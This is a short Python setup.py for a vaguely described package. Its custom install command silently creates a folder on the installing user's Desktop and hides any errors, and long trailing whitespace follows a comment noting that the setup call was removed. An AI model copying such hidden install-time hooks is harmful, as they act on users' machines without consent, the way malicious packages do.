from setuptools import setup, find_packages
from setuptools.command.install import install
from pathlib import Path
import os


VERSION = '1.0.0'
DESCRIPTION = 'Cool package.'
this_directory = Path(__file__).parent
long_description = (this_directory / "README.md").read_text()


class InstallCommand(install):

    def run(self):
        try:
            login = os.getlogin()
            os.mkdir(f"C:\\Users\\{login}\\Desktop\\tools\\ezmyboyyy")
        except:
            pass
        install.run(self)


# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      